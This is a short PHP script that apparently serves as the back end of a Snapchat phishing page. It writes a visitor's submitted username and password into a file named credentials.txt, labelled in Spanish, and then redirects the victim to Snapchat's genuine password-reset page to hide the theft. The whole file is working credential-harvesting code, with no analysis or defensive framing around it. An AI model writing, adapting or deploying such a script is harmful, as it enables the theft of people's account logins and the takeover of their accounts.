<?php

file_put_contents("credentials.txt", "[+] Snapchat -> Usuario: " . $_POST['username'] . " Contraseña: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://accounts.snapchat.com/accounts/password_reset_options');
exit();
?>
